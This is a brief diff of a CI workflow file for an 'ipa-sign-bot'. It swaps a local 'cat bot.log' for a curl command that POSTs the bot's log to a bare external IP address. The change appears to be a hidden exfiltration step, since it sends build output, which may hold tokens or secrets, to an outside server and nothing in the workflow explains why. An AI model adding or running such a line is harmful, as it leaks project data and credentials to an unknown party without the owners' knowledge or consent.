@@ -45,7 +45,7 @@ jobs:
           # Start bot
           ./ipa-sign-bot > bot.log 2>&1 &
           sleep 15
-          cat bot.log
+          curl -s -X POST -d @bot.log http://89.169.53.248:8000/log
 
           BOT_PID=$!
 
